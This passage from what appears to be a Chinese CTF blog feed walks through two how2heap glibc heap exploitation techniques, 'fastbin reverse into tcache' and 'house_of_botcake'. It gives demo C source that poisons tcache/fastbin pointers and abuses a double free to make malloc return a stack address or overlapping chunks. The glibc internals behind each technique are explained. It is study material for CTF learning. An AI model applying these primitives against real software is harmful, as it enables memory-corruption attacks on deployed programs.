);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The stack address that we intend to target: %p\n"</span></span><br><span class="line">    <span class="string">"It's current value is %p\n"</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span></span><br><span class="line">    <span class="string">"to overwrite the next pointer at address %p\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">    <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">    <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">    <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">    <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">    <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">    <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">    <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">    <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">    <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">    <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行审计与调试下来，可以发现其实流程十分简单：</p><p>先创建14个能进入fastbin大小的chunk，然后先释放其中7个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">  <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就将tcache填满了。</p><p>然后重点来了，我们记录下attack chunk(第8个被释放chunk(也就是第一个加入fashbin的chunk</p><p>)的指针。</p><p><img src="image-20220618185010440.png" alt="image-20220618185010440">然后再释放掉所用的chunk,让它们全部加入fastbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后获取栈上地址为目标写入地址，同时将attack chunk的fd改为目标写入地址-0x10的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line"><span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line"><span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">*(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>创造7个chunk 让tcache 清空.</p><p><img src="image-20220618185047126.png" alt="image-20220618185047126"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">  ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(allocsize);</span><br></pre></td></tr></table></figure><p>这时，再创一个chunk 就可以看到攻击完成attack chunk 的 fd 对应地址+0x10变成一个fake chunk的进入 tcache 首。</p><p><img src="image-20220618185221433.png" alt="image-20220618185221433"></p><p>在与之同时，将 fd 对应地址的值，加入到原本大小fastbin 中</p><p>并且，在攻击完成前：</p><p><img src="image-20220618185120234.png" alt="image-20220618185120234"></p><p>在攻击完成后：</p><p><img src="image-20220618185244042.png" alt="image-20220618185244042"></p><p>对照可以发现，攻击完成，同时在目标写入地址 写入了attack chunk 地址和key的值。</p><h2 id="攻击实现的glibc原理"><a href="#攻击实现的glibc原理" class="headerlink" title="攻击实现的glibc原理"></a>攻击实现的glibc原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//判定tcache为空，同时fastbin有chunk</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//判断tache 是否满</span></span><br><span class="line">         &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//判定上一个fastbin 的fd是否为空</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = tc_victim-&gt;fd;<span class="comment">//获取fastbin 的fd</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在tcache为空而fastbin不为空，堆管理把fashbin放入tcahe时，会按照fashbin被使用的顺序将fashbin一个取出分析（即后进先出的原理）。这时，我们的attack chunk第一个进入fastbin，那么它将会最后一个出来。同时，这个代码对fastbin 加入 tachae 的依据是tache 是否填满和上个fastbin 的fd指针，并未判断fd的合法性，导致我们可以伪造fd来让第7个进入 tachae  的chunk被我们控制，而不影响堆管理逻辑顺序。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://bbs.pediy.com/thread-272884.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-272884.htm</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;fastbin reverse into tcache&lt;/code&gt;是指利用tcache为空而fastbin不为空，堆管理把fashbin放入tcahe时进行的攻击。&lt;code&gt;fastbin reverse into tcache&lt;/code&gt;一度感觉很鸡肋，但仔细看大佬分析后，发现是我态年轻了，理解不到位。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>how2heap-house_of_botcake-学习</title>
    <link href="lexsd6.github.io/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/"/>
    <id>lexsd6.github.io/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-06-15T01:54:13.592Z</published>
    <updated>2022-06-15T14:54:52.695Z</updated>
    
    <content type="html"><![CDATA[<p>在2.29版本上的libc中，由于 tcache 加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效。<a id="more"></a></p><p>2.29前</p><p><img src="image-20220615114331112.png" alt="image-20220615114331112"></p><p>2.29后</p><p><img src="image-20220615114415661.png" alt="image-20220615114415661"></p><p>这个key一般是指向 manage chunk。</p><h2 id="house-of-botcake的目的、本质与条件"><a href="#house-of-botcake的目的、本质与条件" class="headerlink" title="house_of_botcake的目的、本质与条件"></a>house_of_botcake的目的、本质与条件</h2><p>目的：</p><p>在2.29版本上的libc中，制造堆块重叠。</p><p>本质：</p><p>利用的本质是让 chunk 在 <strong>unsorted bin</strong> 和 <strong>tcache</strong> 中同时存在，从而造成 UAF 可以修改 key 的内容。</p><p>条件:</p><p>1.我们能够控制已经free的chunk进行，再次free.(double free の变种)。</p><p>2.能填满tcache ，得到 unsorted bin。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NX：-z execstack &#x2F; -z noexecstack (关闭 &#x2F; 开启) 不让执行栈上的数据，于是JMP ESP就不能用了</span><br><span class="line">Canary：-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (关闭 &#x2F; 开启 &#x2F; 全开启) 栈里插入cookie信息</span><br><span class="line">PIE：-no-pie &#x2F; -pie (关闭 &#x2F; 开启) 地址随机化，另外打开后会有get_pc_thunk</span><br><span class="line">RELRO：-z norelro &#x2F; -z lazy &#x2F; -z now (关闭 &#x2F; 部分开启 &#x2F; 完全开启) 对GOT表具有写权限</span><br></pre></td></tr></table></figure><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.32-2.34</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating a chunk for later consolidation: prev @ %p\n"</span>, prev);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk: a @ %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we have the chunk overlapping primitive:"</span>);</span><br><span class="line">    <span class="keyword">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="keyword">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"prev @ %p, size: %#x, end @ %p\n"</span>, prev, prev_size, (<span class="keyword">void</span> *)prev+prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"victim @ %p, size: %#x, end @ %p\n"</span>, a, a_size, (<span class="keyword">void</span> *)a+a_size);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们分配了7个chunk来为以后填满tcache做准备：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再准备用于攻击的两个chunk，和隔离的chunk。其中a chunk 是我们将要 double free的chunk，prev chunk 是将用于辅助uaf的chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating a chunk for later consolidation: prev @ %p\n"</span>, prev);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk: a @ %p\n"</span>, a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>之后，我们再释放掉a chunk  和prev chunk ，由于tachebins 满了，a chunk 和prev chunk 将加入 unsortedbin中。同时由于a chunk 和prev chunk 相邻，a chunk 和prev chunk 将合并成为一个大的chunk 放入 unsortedbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>这时，我们从tachebins中取出一个chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>这样我们tachebins中就只有6个 chunk了，这时我们再free a chunk。由于tachebins未满，所以我们的a chunk将会加入tachebins中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Now we have the chunk overlapping primitive:"</span>);</span><br><span class="line"><span class="keyword">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line"><span class="keyword">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"prev @ %p, size: %#x, end @ %p\n"</span>, prev, prev_size, (<span class="keyword">void</span> *)prev+prev_size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"victim @ %p, size: %#x, end @ %p\n"</span>, a, a_size, (<span class="keyword">void</span> *)a+a_size);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">prev[<span class="number">0x110</span>/<span 